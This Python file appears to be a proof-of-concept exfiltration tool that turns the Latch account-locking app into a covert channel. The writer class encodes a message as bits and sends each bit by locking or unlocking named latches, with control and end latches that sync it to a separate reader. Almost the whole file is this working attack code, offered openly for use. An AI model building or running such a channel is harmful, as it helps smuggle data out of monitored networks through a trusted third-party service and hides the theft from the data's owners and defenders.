from exfiltration import LatchExfiltration
import time
import os
import argparse

class LatchExfiltrationWriter(LatchExfiltration):

    def __init__(self, message):
        # get account id from model
        self.account_id = os.environ.get('LATCH_ACCOUNT_ID', '')
        LatchExfiltration.__init__(self, self.account_id)
        self.exfiltrate_message(message)

    # Writer
    def exfiltrate_byte(self, bits_string):
        #string_filtered = '0' + string_filtered if len(string_filtered) != 8 else string_filtered #add 0 becaise of bad conversion
        for index, char in enumerate(bits_string):
            latch_status = self.dict_converted.get(str(index + 1), '')
            if char == '0':
                self.latch.unlockLatch(latch_status)
            else:
                self.latch.lockLatch(latch_status)
        print('Sending: ' + self.ascii_to_string(bits_string) + ' ---> ' + bits_string)
        
        self.latch.lockLatch(self.dict_converted.get('control', ''))



# CAMBIAR MUCHAS COSAS
    def exfiltrate_message(self, message):
        print('Writing "' + message + '"...' )
        while not self.latch.getOperationStatus(self.dict_converted.get('reader', '')):
            time.sleep(0.2) 
        message = self.read_string_to_byte(message) # secret
        for byte in message:
            self.exfiltrate_byte(byte)
            while self.latch.getOperationStatus(self.dict_converted.get('control', '')):
                time.sleep(0.5)
        self.latch.lockLatch(self.dict_converted.get('end', ''))



if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="This script takes a message to exfiltrate throughout Latch App")
    parser.add_argument('-m', '--message', help='message to sent')
    args = parser.parse_args()
    message = args.message if args.message else ""

    latch_writer = LatchExfiltrationWriter(message)
